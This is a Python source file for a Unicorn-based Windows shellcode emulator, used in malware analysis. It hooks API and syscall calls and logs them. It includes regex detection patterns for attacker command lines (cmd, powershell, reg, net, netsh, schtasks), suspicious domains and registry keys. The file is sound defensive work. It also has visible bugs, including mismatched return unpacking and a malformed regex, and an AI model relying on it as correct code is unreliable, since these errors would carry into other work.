#!/usr/bin/env python

from __future__ import print_function
from unicorn import *
from unicorn.x86_const import *
from capstone import *
from struct import pack, unpack
from collections import defaultdict
from pathlib import Path
from .modules import *
from .DLLs.dict_signatures import *
from .DLLs.dict2_signatures import *
from .DLLs.dict3_w32 import *
from .DLLs.dict4_ALL import *
from .DLLs.hookAPIs import *
from .DLLs.syscall_signatures import *
from .helper.emuHelpers import *
from .helper.sharemuDeob import *
# from .helper.shellMemory import *

import sys
import json
import pefile
import re
import os
import argparse
import colorama
import binascii
import traceback
# from sharemuDeob import *
# artifacts2= [] 
# net_artifacts = []
# file_artifacts = []
# exec_artifacts = []

class EMU():
    def __init__(self):
        self.maxCounter=500000
        self.breakOutOfLoops=True
        self.maxLoop = 50000 # to break out of loops
        self.entryOffset=0
        self.codeCoverage = True
        self.beginCoverage = False
        self.timelessDebugging = False  #todo: bramwell
        self.winVersion = "Windows 10"
        self.winSP = "2004"

class Coverage():
    def __init__(self, uc):
        self.address = 0x0
        self.regs = {'eax': 0x0, 'ebx': 0x0, 'ecx': 0x0, 'edx': 0x0, 'edi': 0x0, 'esi': 0x0, 'esp': 0x0, 'ebp': 0x0}
        self.stack = b''
        self.inProgress = False

        # Save registers into dict
        for reg, val in self.regs.items():
            self.regs[reg] = int(constConvert(uc, reg))

        # Save stack bytes
        esp = self.regs['esp']
        ebp = self.regs['ebp']
        stack_bytes_len = ebp - esp
        if stack_bytes_len < 0:
            stack_bytes_len = STACK_ADDR - esp
        self.stack = bytes(uc.mem_read(esp, stack_bytes_len))

    def dump_saved_info(self, uc):
        # Dump registers
        for reg, val in self.regs.items():
            set_register(uc, reg, val)

        # Restore the stack
        uc.mem_write(self.regs['esp'], self.stack)

    def print_saved_info(self):
        print(f"Address: {hex(self.address)}")
        for reg, val in self.regs.items():
            print(f"{reg}: {hex(val)}")
        print(f"Stack = {binaryToStr(self.stack)}")

artifacts = []
net_artifacts = []
file_artifacts = []
exec_artifacts = []
coverage_objects = []
programCounter = 0
verbose = True

CODE_ADDR = 0x12000000
CODE_SIZE = 0x1000
STACK_ADDR = 0x17000000
EXTRA_ADDR = 0x18000000
codeLen=0
with open(os.path.join(os.path.dirname(__file__), 'WinSysCalls.json'), 'r') as syscall_file:
    syscall_dict = json.load(syscall_file)
export_dict = {}
logged_calls = defaultdict(list)
loggedList = []
logged_syscalls = []
logged_types = defaultdict(list)
custom_dict = defaultdict(list)
logged_dlls = []
createdProcesses = []
paramValues = []
network_activity = {}
jmpInstructs = {}
address_range = []

traversedAdds=set()
loadModsFromFile = True
foundDLLAddresses = os.path.join(os.path.dirname(__file__), "foundDLLAddresses.txt")
outFile = open(os.path.join(os.path.dirname(__file__), 'emulationLog.txt'), 'w')
cleanStackFlag = False
stopProcess = False
cleanBytes = 0
bad_instruct_count = 0
prevInstruct = []
expandedDLLsPath = os.path.join(os.path.dirname(__file__), "DLLs\\")
prevInstructs = []
loopInstructs = []
loopCounter = 0
verOut = ""
bVerbose = True

colorama.init()

red ='\u001b[31;1m'
gre = '\u001b[32;1m'
yel = '\u001b[33;1m'
blu = '\u001b[34;1m'
mag = '\u001b[35;1m'
cya = '\u001b[36;1m'
whi = '\u001b[37m'
res = '\u001b[0m'
res2 = '\u001b[0m'

def loadDlls(mu):
    global export_dict
    global expandedDLLsPath
    path = 'C:\\Windows\\SysWOW64\\'

    # Create foundDllAddresses.txt if it doesn't already exist
    if not os.path.exists(foundDLLAddresses):
        Path(foundDLLAddresses).touch()

    runOnce=False
    for m in mods:
        if os.path.exists(mods[m].d32) == False:
            continue
        if os.path.exists("%s%s" % (expandedDLLsPath, mods[m].name)):
            dll=readRaw(expandedDLLsPath+mods[m].name)
            # Unicorn line to dump the DLL in our memory
            mu.mem_write(mods[m].base, dll)
        # Inflate dlls so PE offsets are correct
        else:
            if not runOnce:
                if os.path.exists(mods[m].d32) == False:
                    print("[*] Unable to locate ", mods[m].d32,
                          ". It is likely that this file is not included in your version of Windows.")
                print("Warning: DLLs must be parsed and inflated from a Windows OS.\n\tThis may take several minutes to generate the initial emulation files.\n\tThis initial step must be completed only once from a Windows machine.\n\tThe emulation will not work without these.")
                runOnce=True
            pe=pefile.PE(mods[m].d32)
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                try:
                    export_dict[mods[m].base + exp.address] = (exp.name.decode(), mods[m].name)
                except:
                    export_dict[mods[m].base + exp.address] = "unknown_function"

            dllPath = path + mods[m].name
            rawDll = padDLL(dllPath, mods[m].name, expandedDLLsPath)

            # Dump the dll into unicorn memory
            mu.mem_write(mods[m].base, rawDll)

    saveDLLsToFile(export_dict, foundDLLAddresses)

    with open(foundDLLAddresses, "r") as f:
        data = f.read()
    APIs = data.split("\n")
    for each in APIs:
        vals=each.split(", ")
        try:
            address=int(vals[0], 16)
            apiName=vals[1]
            dllName=vals[2]

            if apiName not in export_dict:
                export_dict[address] = ((apiName, dllName))
        except:
            pass

def coverage_branch(uc, address, mnemonic, bad_instruct):
    global coverage_objects

    if len(coverage_objects) > 0:
        # Start first coverage
        if coverage_objects[0].inProgress == False:
            uc.reg_write(UC_X86_REG_EIP, coverage_objects[0].address)
            coverage_objects[0].dump_saved_info(uc)
            coverage_objects[0].inProgress = True
        # Case for every other object
        elif (address in traversedAdds and address != 0x18000000) or retEnding(uc, mnemonic) or bad_instruct:
            del coverage_objects[0]

            if len(coverage_objects) > 0:
                uc.reg_write(UC_X86_REG_EIP, coverage_objects[0].address)
                coverage_objects[0].dump_saved_info(uc)
                coverage_objects[0].inProgress = True
    else:
        uc.emu_stop()

def breakLoop(uc, jmpFlag, jmpType, op_str, addr, size):
    eflags = uc.reg_read(UC_X86_REG_EFLAGS)

    if boolFollowJump(jmpFlag, jmpType, eflags):
        if "0x" in op_str:
            jmpLoc = addr + signedNegHexTo(op_str)
        else:
            jmpLoc = addr + int(op_str)
        uc.reg_write(UC_X86_REG_EIP, jmpLoc)
    else:
        uc.reg_write(UC_X86_REG_EIP, addr + size)


def hook_WindowsAPI(uc, addr, ret, size, funcAddress):
    global stopProcess
    global cleanBytes

    bprint ("funcName", hex(funcAddress), hex(addr))
    # input()
    ret += size
    push(uc, ret)
    eip = uc.reg_read(UC_X86_REG_EIP)
    esp = uc.reg_read(UC_X86_REG_ESP)

    try:
        funcName = export_dict[funcAddress][0]
        dll = export_dict[funcAddress][1]
        dll = dll[0:-4]

        # Log usage of DLL
        if dll not in logged_dlls:
            logged_dlls.append(dll)
    except:
        funcName = "DIDNOTFIND- " + str(hex((funcAddress)))
    try:
        funcInfo, cleanBytes = globals()['hook_' + funcName](uc, eip, esp, export_dict, addr)
        logCall(funcName, funcInfo)

    except:
        try:
            bprint("hook_default", hex(funcAddress))
            hook_default(uc, eip, esp, funcAddress, export_dict[funcAddress][0], addr)
        except:
            print("\n\tHook failed at " + str(hex(funcAddress)) + ".")
    
    fRaw.add(funcAddress, funcName)
    if exitAPI(funcName):
        stopProcess = True
    # if 'LoadLibrary' in funcName and uc.reg_read(UC_X86_REG_EAX) == 0:
    #     print("\t[*] LoadLibrary failed. Emulation ceasing.")
    #     stopProcess = True

    uc.reg_write(UC_X86_REG_EIP, EXTRA_ADDR)

    return ret

def hook_code(uc, address, size, user_data):
    global cleanBytes, verbose
    global outFile
    global programCounter
    global cleanStackFlag
    global stopProcess
    global prevInstruct
    global prevInstructs
    global loopInstructs
    global loopCounter
    global traversedAdds
    global coverage_objects
    global em
    global bad_instruct_count



    funcName = ""

    # # Exit if code executed is out of range
    # if stopProcess != False:
    #     for a in address_range:
    #         # print(a[0], a[1])
    #         if address < a[0] or address > (a[1]+a[0]):
    #             stopProcess = True

    if cleanStackFlag == True:
        cleanStack(uc, cleanBytes)
        cleanStackFlag = False

    addressF=address
    if stopProcess == True:
        uc.emu_stop()

    programCounter += 1
    if programCounter > em.maxCounter and em.maxCounter > 0:
        print("Exiting emulation because max counter of {em.maxCounter} reached")
        uc.emu_stop()

    instructLine = ""

    if verbose:
        instructLine+=giveRegs(uc)
        instructLine += "0x%x" % address + '\t'

    shells = b''
    try:
        shells = uc.mem_read(address, size)
    except Exception as e:
        # print ("Error: ", e)
        # print(traceback.format_exc())
        instructLine += " size: 0x%x" % size + '\t'   # size is overflow - why so big?
        outFile.write("abrupt end:  " + instructLine)
        print("abrupt end: error reading line of shellcode")
        stopProcess = True
        # return # terminate func early   --don't comment - we want to see the earlyrror

    ret = address
    base = 0

    # Print out the instruction
    mnemonic=""
    op_str=""
    t=0
    bad_instruct = False

    fRaw.addBytes(shells, addressF-CODE_ADDR, size)
    finalOut=uc.mem_read(CODE_ADDR + em.entryOffset,codeLen)
    fRaw.giveEnd(finalOut)

    if shells == b'\x00\x00':
        bad_instruct_count += 1
        if bad_instruct_count > 5:
            bad_instruct = True

    for i in cs.disasm(shells, address):
        val = i.mnemonic + " " + i.op_str # + " " + shells.hex()
        if t==0:
            mnemonic=i.mnemonic
            op_str=i.op_str
            # print ("mnemonic op_str", mnemonic, op_str)

        if verbose:
            shells = uc.mem_read(base, size)

            instructLine += val + '\n'
            outFile.write(instructLine)
            loc = 0
            for i in cs.disasm(shells, loc):
                val = i.mnemonic + " " + i.op_str
        t+=1

    # Jump to code coverage branch if shellcode is already done
    if em.beginCoverage == True and em.codeCoverage == True:
        coverage_branch(uc, address, mnemonic, bad_instruct)

    jumpAddr = controlFlow(uc, mnemonic, op_str)

    # If jmp instruction, increment jmp counter to track for infinite loop and track in code coverage
    jmpFlag = getJmpFlag(mnemonic)
    if jmpFlag != "":
        if address not in jmpInstructs:
            jmpInstructs[address] = 1
        else:
            jmpInstructs[address] += 1

        if jmpInstructs[address] >= em.maxLoop and em.breakOutOfLoops:
            breakLoop(uc, jmpFlag, mnemonic, op_str, address, len(shells))
            jmpInstructs[address] = 0

        # track for code coverage
        if address not in traversedAdds:
            cvg = Coverage(uc)
            coverage_objects.append(cvg)
            eflags = uc.reg_read(UC_X86_REG_EFLAGS)
            if boolFollowJump(jmpFlag, mnemonic, eflags):
                cvg.address = jumpAddr
            else:
                cvg.address = address + size

    traversedAdds.add(address)


    # Hook usage of Windows API function
    if jumpAddr > NTDLL_BASE and jumpAddr < WTSAPI32_TOP:
        ret = hook_WindowsAPI(uc, address, ret, size, jumpAddr)

    # Hook usage of Windows Syscall
    if jumpAddr == 0x5000:
        hook_sysCall(uc, address, size)

    if retEnding(uc, mnemonic) or bad_instruct:
        stopProcess = True

    # Begin code coverage if the shellcode is finished, and the option is enabled
    if stopProcess and em.codeCoverage and not em.beginCoverage:
        stopProcess = False
        em.beginCoverage = True
        coverage_branch(uc, address, mnemonic, bad_instruct)

    # Prevent the emulation from stopping if code coverage still has objects left
    if len(coverage_objects) > 0 and em.beginCoverage:
        stopProcess = False

    # If parameters were used in the function, we need to clean the stack
    if address == EXTRA_ADDR:
        cleanStackFlag = True

def hook_syscallBackup(uc, eip, esp, funcAddress, funcName, callLoc, syscallID):
    try:
        try:
            apiDict = dict_kernel32[funcName]
        except:
            try:
                apiDict = dict_ntdll[funcName]
            except:
                apiDict = dict_user32[funcName]

        paramVals = getParams(uc, esp, apiDict, 'dict1')

        paramTypes = ['DWORD'] * len(paramVals)
        paramNames = ['arg'] * len(paramVals)

        retVal = 32
        uc.reg_write(UC_X86_REG_EAX, retVal)
        funcInfo = (funcName, hex(callLoc), hex(retVal), 'INT', paramVals, paramTypes, paramNames, False, syscallID)
        logSysCall(funcName, funcInfo)
    except Exception as e:
        print("Error!", e)
        print(traceback.format_exc())

def hook_syscallDefault(uc, eip, esp, funcAddress, funcName, sysCallID,callLoc):
    returnType, paramVals, paramTypes, paramNames, nt_tuple = '','','','',()
    dll = 'ntdll'
    try:
        nt_tuple = syscall_signature[funcName]
        paramVals = getParams(uc, esp, nt_tuple, 'ntdict')
        paramTypes = nt_tuple[1]
        paramNames = nt_tuple[2]
        returnType = nt_tuple[3]
        retVal = findRetVal(funcName, syscallRS)

        funcInfo = (funcName, hex(callLoc), hex(retVal), returnType, paramVals, paramTypes, paramNames, False, sysCallID)
        logSysCall(funcName, funcInfo)
    except:
        hook_syscallBackup(uc, eip, esp, funcAddress, funcName, callLoc, sysCallID)

def hook_sysCall(uc, address, size):
    global logged_dlls
    global stopProcess

    ret = address + size
    push(uc, ret)

    syscallID = uc.reg_read(UC_X86_REG_EAX)
    sysCallName = syscall_dict[em.winVersion][em.winSP][str(syscallID)]
    exportAddress = 0
    eip = uc.reg_read(UC_X86_REG_EIP)
    esp = uc.reg_read(UC_X86_REG_ESP)

    try:
        funcInfo = globals()['hook_' + sysCallName](uc, eip, esp, address)
        funcInfo.append(syscallID)
        logSysCall(sysCallName, funcInfo)
    except:
        try:
            hook_syscallDefault(uc, eip, esp, exportAddress, sysCallName, syscallID, address)
        except:
            print("\n\tHook failed at " + str(hex(exportAddress)) + ".")
    if sysCallName == 'NtTerminateProcess':
        stopProcess = True
    if 'LoadLibrary' in sysCallName and uc.reg_read(UC_X86_REG_EAX) == 0:
        print("\t[*] LoadLibrary failed. Emulation ceasing.")
        stopProcess = True

    uc.reg_write(UC_X86_REG_EIP, EXTRA_ADDR)

# Most Windows APIs use stdcall, so we need to clean the stack
def cleanStack(uc, numBytes):
    if numBytes > 0:
        esp = uc.reg_read(UC_X86_REG_ESP)
        uc.reg_write(UC_X86_REG_ESP, esp+numBytes)

    # reset cleanBytes
    global cleanBytes
    cleanBytes = 0

# Get the parameters off the stack
def findDict(funcAddress, funcName, dll=None):
    try:
        global cleanBytes
        if dll == None:
            dll = export_dict[funcAddress][1]
            dll = dll[0:-4]
        paramVals = []

        dict4 = tryDictLocate('dict4', dll)
        dict2 = tryDictLocate('dict2', dll)
        dict1 = tryDictLocate('dict', dll)

        bprint ("dll", dll)
        # Log usage of DLL
        if dll not in logged_dlls:
            logged_dlls.append(dll)

        # Use dict three if we find a record for it
        if funcName in dict3_w32:
            return dict3_w32[funcName], 'dict3', dll

        # Use dict2 if we can't find the API in dict1
        elif funcName in dict2:
            return dict2[funcName], 'dict2', dll

        # Use dict four (WINE) if we find a record for it
        elif funcName in dict4:
            return dict4[funcName], 'dict4', dll

        # If all else fails, use dict 1
        elif funcName in dict1:
            return dict1[funcName], 'dict1', dll
        else:
            bprint ("NOT FOUND!")
            return "none", "none", dll
    except Exception as e:
        bprint("Oh no!!!", e)
        bprint(traceback.format_exc())

def getParams(uc, esp, apiDict, dictName):
    global cleanBytes

    paramVals = []

    if dictName == 'dict1':
        numParams = apiDict[0]
        for i in range(0, numParams):
            p = uc.mem_read(esp + (i*4+4), 4)
            p = unpack('<I', p)[0]
            paramVals.append(hex(p))
        cleanBytes = apiDict[1]
    else:
        numParams = apiDict[0]

        for i in range(0, numParams):
            paramVals.append(uc.mem_read(esp + (i*4+4), 4))
            paramVals[i] = unpack('<I', paramVals[i])[0]

            # Check if parameter is pointer, then convert
            if apiDict[1][i][0] == 'P':
                try:
                    pointer = paramVals[i]
                    pointerVal = getPointerVal(uc,pointer)
                    paramVals[i] = buildPtrString(pointer, pointerVal)
                except:
                    pass

            # Check if the type is a string
            elif "STR" in apiDict[1][i]:
                try:
                    paramVals[i] = read_string(uc, paramVals[i])
                except:
                    pass
            else:
                paramVals[i] = hex(paramVals[i])

        # Go through all parameters, and see if they can be interpreted as a string
        for i in range (0, len(paramVals)):
            if "STR" not in apiDict[1][i]:
                try:
                    p = int(paramVals[i], 16)
                    if (0x40000000 < p and p < 0x50010000):
                        string = read_string(uc, p)
                        if len(string) < 30:
                            paramVals[i] = string
                except:
                    pass

        cleanBytes = apiDict[0] * 4

    return paramVals

# If we haven't manually implemented the function, we send it to this function
# This function will simply find parameters, then log the call in our dictionary
def hook_default(uc, eip, esp, funcAddress, funcName, callLoc):
    try:
        dictName =apiDict=""
        bprint (hex(funcAddress), funcName)
        apiDict, dictName, dll = findDict(funcAddress, funcName)
        # bprint ("", apiDict, dictName, dll, funcName)
        if apiDict=="none" and dll=="wsock32":

            apiDict, dictName, dll = findDict(funcAddress, funcName, "ws2_32")
            bprint ("", apiDict, dictName, dll)

        paramVals = getParams(uc, esp, apiDict, dictName)

        if dictName != 'dict1':
            paramTypes = apiDict[1]
            paramNames = apiDict[2]
        else:
            paramTypes = ['DWORD'] * len(paramVals)
            paramNames = ['arg'] * len(paramVals)

        dictR1 = globals()['dictRS_'+dll]
        retVal=findRetVal(funcName, dictR1)
        bprint ("returnVal", funcName, retVal)
        uc.reg_write(UC_X86_REG_EAX, retVal)

        retValStr=getRetVal(retVal)
        if retValStr==32:
            funcInfo = (funcName, hex(callLoc), hex(retValStr), 'INT', paramVals, paramTypes, paramNames, False)
        else:
            funcInfo = (funcName, hex(callLoc), (retValStr), '', paramVals, paramTypes, paramNames, False)

        logCall(funcName, funcInfo)
    except Exception as e:
        print ("Error!", e)
        print(traceback.format_exc())

def logCall(funcName, funcInfo):
    global paramValues
    # logged_calls[funcName].append(funcInfo)
    loggedList.append(funcInfo)
    paramValues += funcInfo[4]

def logSysCall(syscallName, syscallInfo):
    global paramValues
    logged_syscalls.append(syscallInfo)
    paramValues += syscallInfo[4]

def findArtifacts():
    paths = []
    path_artifacts = []
    file_artifacts = []
    commandLine_artifacts = []
    web_artifacts = []
    registry_artifacts = []
    exe_dll_artifacts =[]

    ## ============================================================================
    ## PATHs
    ## -----------------------------
    find_environment = r"(?:(?:\%[A-Za-z86]+\%)(?:(?:\\|\/|\\\\)(?:[^<>\"\*\/\\\|\?\n])+)+)"
    find_letterDrives = r"(?:(?:[A-za-z]:)(?:(?:\\|\/|\\\\)(?:[^<>\"\*\/\\\|\?\n])+)+)"
    find_relativePaths = r"(?:(?:\.\.)(?:(?:\\|\/|\\\\)(?:[^<>\"\*\/\\\|\?\n]+))+)"
    find_networkShares = r"(?:(?:\\\\)(?:[^<>\"\*\/\\\|\?\n]+)(?:(?:\\|\/|\\\\)(?:[^<>\"\*\/\\\|\?\n]+(?:\$|\:)?))+)"
    total_findPaths = find_letterDrives+"|"+find_relativePaths+"|"+find_networkShares+"|"+find_environment
    ##*****************************************************************************
    ## FILES
    ## -----------------------------
    find_files = r"(?:[^<>:\"\*\/\\\|\?\n]+)(?:\.[A-Za-z1743]{2,5})"
    # gives a couple false positives, but this can be improved upon slowly
    ## works best when paired with other regex.
    find_zip = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:7z|zip|rar|tar|tar.gz)(?:\b)"
    find_genericFiles = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:bin|log|exe|dll|txt|ini|ico|lnk|tmp|bak|cfg|config|msi|dat|rtf|cer|sys|cab|iso|db|asp|  aspx|html|htm)(?:\b)"
    find_images = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:jpg|gid|gmp|jpeg|png|tif|gif|bmp|tiff)(?:\b)"
    find_programming = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:com|cpp|java|js|php|py|bat|c|pyc|py3|pyw|jar|eps)(?:\b)"
    find_workRelated = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:xls|xlsm|xlsx|ppt|pptx|doc|docx|pdf|wpd|odt|dodp|pps|key|diff|docm|eml|email|msg|pst|pub|    sldm|sldx|wbk|xll|xla|xps|dbf|accdb|accde|accdr|accdt|sql|sqlite|mdb)(?:\b)"
    find_videoAudio = r"(?:[^<>:\"\*\/\\\|\?\n]+\.)(?:mp4|mpg|mpeg|avi|mp3|wav|aac|adt|adts|aif|aifc|aiff|cda|flv|m4a)(?:\b)"
    find_totalFiles = find_genericFiles+"|"+find_images+"|"+find_programming+"|"+find_workRelated+"|"+find_videoAudio
    find_totalFilesBeginning = "^"+find_genericFiles+"|^"+find_images+"|^"+find_programming+"|^"+find_workRelated+"|^"+find_videoAudio
    
    ##*****************************************************************************
    ## COMMAND LINE ARGUMENTS
    ## -----------------------------
    valid_cmd_characters = r"(?:[A-Za-z0-9 \/\\=\-_:!@#\$%\^&\*\(\)><\.\"'`\{\};\[\]\+,\|]+)"
    find_cmdLine = r"(?:(?:cmd(?:\.exe)?)(?:\s+(?:\/[cCkKaAuUdDxX]|\/[eEfFvV]:..|\/[tT]:[0-9a-fA-F])+)+)"
    find_powershell = r"(?:powershell(?:\.exe)?)"
    find_regCMD = r"(?:reg(?:\.exe)?(?:\s+(?:add|compare|copy|delete|export|import|load|query|restore|save|unload))+)"
    find_netCMD = r"(?:net(?:\.exe)?(?:\s+(?:accounts|computer|config|continue|file|group|help|helpmsg|localgroup|name|pause|print|send|session|    share|start|statistics|stop|time|use|user|view))+)"
    find_schtasksCMD = r"(?:schtasks(?:\.exe)?\s+)(?:\/(?:change|create|delete|end|query|run))"
    find_netsh = r"(?:netsh(?:\.exe)?\s+(?:abort|add|advfirewall|alias|branchcache|bridge|bye|commit|delete|dhcpclient|dnsclient|dump|exec|exit|    firewall|help|http|interface|ipsec|ipsecdosprotection|lan|namespace|netio|offline|online|popd|pushd|quit|ras|rpc|set|show|trace|unalias|    wfp|winhttp|winsock))"
    cmdline_args = find_cmdLine+valid_cmd_characters
    powershell_args= find_powershell+valid_cmd_characters
    reg_args = find_regCMD+valid_cmd_characters
    net_args = find_netCMD+valid_cmd_characters
    netsh_args = find_netsh+valid_cmd_characters
    schtask_args = find_schtasksCMD+valid_cmd_characters
    total_commandLineArguments = cmdline_args+"|"+powershell_args+ "|"+reg_args+"|"+net_args+"|"+netsh_args+"|"+schtask_args
    
    ##*****************************************************************************
    ## WEB
    ## -----------------------------
    valid_web_ending1 = r"(?:\\|\/|\\\\|:)(?:[^\s\'\",]+)"
    valid_web_ending2 = r"(?:\b)"
    find_website = r"(?:(?:(?:http|https):\/\/|www)(?:[^\s\'\",]+))"
    find_doubleLetterDomains = r"(?:www)?(?:[^\\\s\'\",])+\.(?:cn|bd|it|ul|cd|ch|br|ml|ga|us|pw|eu|cf|uk|ws|zw|ke|am|vn|tk|gq|pl|ca|pe|su|de|me|    au|fr|be|pk|th|it|nid|tw|cc|ng|tz|lk|sa|ru)"
    find_tripleLetterDomains = r"(?:www)?(?:[^\\\s\'\",])+\.(?:xyz|top|bar|cam|sbs|org|win|arn|moe|fun|uno|mail|stream|club|vip|ren|kim|mom|pro|    gdn|biz|ooo|xin|cfd|men|com|net|edu|gov|mil|org|int)"
    find_4LettersDomains = r"(?:www)?(?:[^\\\s\'\",])+\.(?:host|rest|shot|buss|cyou|surf|info|help|life|best|live|archi|acam|load|part|mobi|loan|   asia|jetzt|email|space|site|date|want|casa|link|bond|store|click|work|mail)"
    find_5MoreDomains = r"(?:www)?(?:[^\\\s\'\",])+\.(?:monster|name|reset|quest|finance|cloud|kenya|accountants|support|solar|online|yokohama| ryukyu|country|download|website|racing|digital|tokyo|world)"
    find_2_valid1 = find_doubleLetterDomains + valid_web_ending1
    find_2_valid2 = find_doubleLetterDomains + valid_web_ending2
    find_3_valid1 = find_tripleLetterDomains + valid_web_ending1
    find_3_valid2 = find_tripleLetterDomains + valid_web_ending2
    find_4_valid1 = find_4LettersDomains + valid_web_ending1
    find_4_valid2 = find_4LettersDomains + valid_web_ending2
    find_5_valid1 = find_5MoreDomains + valid_web_ending1
    find_5_valid2 = find_5MoreDomains + valid_web_ending2
    find_genericTLD = r"(?:(?:[A-Za-z\.])+\.(?:[A-Za-z0-9]{2,63}))"
    find_ftp = r"(?:(?:ftp):\/\/(?:[\S]+))"
    find_ipAddress = r"(?:(?:[0-9]{,3}\.[0-9]{,3}\.[0-9]{,3}\.[0-9]{,3})(?:[^\s\'\",]+))"
    total_webTraffic = find_website+"|"+find_ftp+"|"+find_ipAddress+"|"+find_2_valid1+"|"+find_2_valid2+"|"+find_3_valid1+"|"+find_3_valid2+"|"+    find_4_valid1+"|"+find_4_valid2+"|"+find_5_valid1+"|"+find_5_valid2
    ##*****************************************************************************
    ## REGISTRY
    ## -----------------------------
    find_HKEY = r"(?:(?:HKEY|HKLM|HKCU|HKCC|HKCR|HKU)(?:\:)?(?:[_A-z0-9])+(?:\\[^\\\n]+)+)"
    find_CurrentUser = r"(?:(?:AppEvents|Console|Control Panel|Environment|EUDC|Identities|Keyboard Layout|Network|Printers|Remote|Software|    System|Uninstall|Volatile Environment)(?:\\[^\\\n]+)+)"
    find_LocalMachine = r"(?:(?:SOFTWARE|SYSTEM|HARDWARE|SAM|BCD00000000)(?:\\[^\\\n]+){+)"
    find_Users = r"(?:(?:\.DEFAULT|S[\-0-9]+(?:_Classes)?)(?:\\[^\\\n]+)+)"
    find_CurrentConfig = r"(?:(?:SOFTWARE|SYSTEM)(?:\\[^\\\n]+)+)"
    total_Registry = find_HKEY +"|"+ find_CurrentUser +"|"+ find_LocalMachine +"|"+ find_Users +"|"+ find_CurrentConfig
    
    ##*****************************************************************************
    ## EXE OR DLL
    ## -----------------------------
    find_exe_dll = r"(?:.*)(?:\.exe|\.dll)(?:\b)"

    for p in paramValues:
        #-------------------------------------------
        #       Finding Paths
        #-------------------------------------------   
        # path_artifacts += re.findall(find_environment,str(p))
        # path_artifacts += re.findall(find_letterDrives,str(p))
        # path_artifacts += re.findall(find_relativePaths,str(p))
        # path_artifacts += re.findall(find_networkShares,str(p))
        paths += re.findall(total_findPaths,str(p))
        # -------------------------------------------
        #       Finding Files
        #-------------------------------------------        
        # file_artifacts += re.findall(find_files,str(p))
        # file_artifacts += re.findall(find_genericFiles,str(p))
        # file_artifacts += re.findall(find_zip,str(p))
        # file_artifacts += re.findall(find_images,str(p))
        # file_artifacts += re.findall(find_programming,str(p))
        # file_artifacts += re.findall(find_workRelated,str(p))
        # file_artifacts += re.findall(find_videoAudio,str(p))
        # file_artifacts += re.findall(find_totalFiles,str(p))
        file_artifacts += re.findall(find_totalFilesBeginning,str(p))
        #-------------------------------------------
        #       Finding Command line
        #-------------------------------------------   
        # commandLine_artifacts += re.findall(cmdline_args,str(p))
        # commandLine_artifacts += re.findall(powershell_args,str(p))
        # commandLine_artifacts += re.findall(reg_args,str(p))
        # commandLine_artifacts += re.findall(net_args,str(p))
        # commandLine_artifacts += re.findall(netsh_args,str(p))
        # commandLine_artifacts += re.findall(schtask_args,str(p),re.IGNORECASE)
        # commandLine_artifacts += re.findall(sc_args,str(p))
        commandLine_artifacts += re.findall(total_commandLineArguments,str(p))
        #-------------------------------------------
        #       Finding WEB
        #-------------------------------------------   
        # web_artifacts += re.findall(find_website,str(p))
        # web_artifacts += re.findall(find_ftp,str(p))
        web_artifacts += re.findall(total_webTraffic,str(p))
        #-------------------------------------------
        #       Finding Registry
        #-------------------------------------------   
        # registry_artifacts += re.findall(find_HKEY,str(p))
        # registry_artifacts += re.findall(find_CurrentUser,str(p))
        # registry_artifacts += re.findall(find_LocalMachine,str(p))
        # registry_artifacts += re.findall(find_Users,str(p))
        # registry_artifacts += re.findall(find_CurrentConfig,str(p))
        registry_artifacts += re.findall(total_Registry,str(p))
        #-------------------------------------------
        #       Finding Exe / DLL
        #-------------------------------------------
         

    for item in paths:
        # print(item)
        if("exe" in item or "EXE" in item):
            exe_dll_artifacts.append(item)
        elif("dll" in item or "DLL" in item):
            exe_dll_artifacts.append(item)
        else:
            path_artifacts.append(item)

        

    return list(dict.fromkeys(path_artifacts)), list(dict.fromkeys(file_artifacts)), list(dict.fromkeys(commandLine_artifacts)), list(dict.fromkeys(web_artifacts)), list(dict.fromkeys(registry_artifacts)), list(dict.fromkeys(exe_dll_artifacts))
"""
def findArtifactsOLD():
    artifacts = []
    net_artifacts = []
    file_artifacts = []
    exec_artifacts = []

    for p in paramValues:
        artifacts += re.findall(r"[a-zA-Z0-9_.-]+\.\S+", str(p))
        net_artifacts += re.findall(r"http|ftp|https:\/\/?|www\.?[a-zA-Z]+\.com|eg|net|org", str(p))
        net_artifacts += re.findall(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", str(p))
        # file_artifacts += re.findall(r"[a-zA-z]:\\[^\\]*?\.\S+|.*(\\.*)$|.exe|.dll", str(p))
        rFile = ".*(\\.*)$"
        # print(p, type(p))
        # result = re.search(rFile, str(p))
        # if result:
        #     file_artifacts.append(str(p))
        # print(file_artifacts)

        # file_artifacts
        exec_artifacts += re.findall(r"\S+\.exe", str(p))
        artifacts += net_artifacts + file_artifacts


    # result = re.search(r, i)

    #     if result:
    #         web_artifacts.append(i)
    #     if i[-4:] == ".exe":
    #         exec_artifacts.append(i)

    #     result = re.search(rfile,i)
    #     if result:
    #         file_artifacts.append(i)

    # print (net_artifacts)
    # print (net_artifacts)

    return list(dict.fromkeys(artifacts)), list(dict.fromkeys(net_artifacts)), list(dict.fromkeys(file_artifacts)), list(dict.fromkeys(exec_artifacts))
"""
def getArtifacts():
    artifacts, net_artifacts, file_artifacts, exec_artifacts = findArtifacts()

# Test X86 32 bit
def test_i386(mode, code):
    global artifacts2
    global outFile
    global cs
    global codeLen
    global address_range
    codeLen=len(code)
